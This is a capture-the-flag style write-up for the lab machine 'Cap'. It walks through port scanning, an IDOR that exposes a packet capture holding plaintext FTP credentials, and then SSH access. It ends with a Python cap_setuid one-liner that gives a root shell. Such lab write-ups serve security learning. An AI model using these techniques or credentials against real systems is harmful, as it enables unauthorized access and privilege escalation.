# Writeup: Cap

# Enumeration

>We'll start with a port scan using the automatic TCP port scan script I've created:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/cap]
└─$ sudo AutoNmap.sh 10.129.38.44
AutoNmap By JBKira
Puertos TCP abiertos:
21,22,80
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
```

>When we access the website, we can see the following:

![image](https://github.com/user-attachments/assets/41b03570-9f9b-4f91-8ee0-79f47bd87ff2)

>On the next tab, we can see that the URL points to a `data/1`; let's check whether it is vulnerable to IDOR (Insecure Direct Object Reference):

![image](https://github.com/user-attachments/assets/7bd3ca79-111b-4628-ac61-dd9ba2c4823b)

>To do this, we'll open Burp Suite and intercept the connection:

```bash
burpsuite &>/dev/null & disown
```

>After trying out various IDs, we can see that ID 0 returns data, so let's view it in the browser so that we can use the download button we saw earlier:

![image](https://github.com/user-attachments/assets/67de10f2-4e80-4c7d-97a6-8309dc272292)

>This will download a .pcap file, which we can open in Wireshark by right-clicking and selecting "Open with Wireshark". In this file, we can find the credentials for the user ``nathan``, which were sent in plain text via FTP: `nathan:Buck3tH4TF0RM3!`

![image](https://github.com/user-attachments/assets/9fcd1266-4dab-4b96-b70d-bd20b6f733c6)

>If we log in via FTP, we'll see the flag user.txt:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/cap]
└─$ ftp 10.129.38.44  
Connected to 10.129.38.44.
220 (vsFTPd 3.0.3)
Name (10.129.38.44:kali): nathan 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||28161|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Apr 16 18:38 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||21664|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |*******************************************************************************************************************************|    33      644.53 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.49 KiB/s)
```

>Furthermore, the credentials can be used to log in via SSH:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/cap]
└─$ ssh nathan@10.129.38.44                                                                            
<SNIP>
nathan@cap:~$
```

# Privilege Escalation

>If we list the capabilities of the system files, we see the following; of these, the one of interest is the `cap_setuid` capability of the Python binary:

```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

>This vulnerability can be exploited to execute a shell as the root user as follows:

```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# whoami
root
```

>We can now go to /root and find the flag in root.txt:

```bash
# ls /root
root.txt  snap
```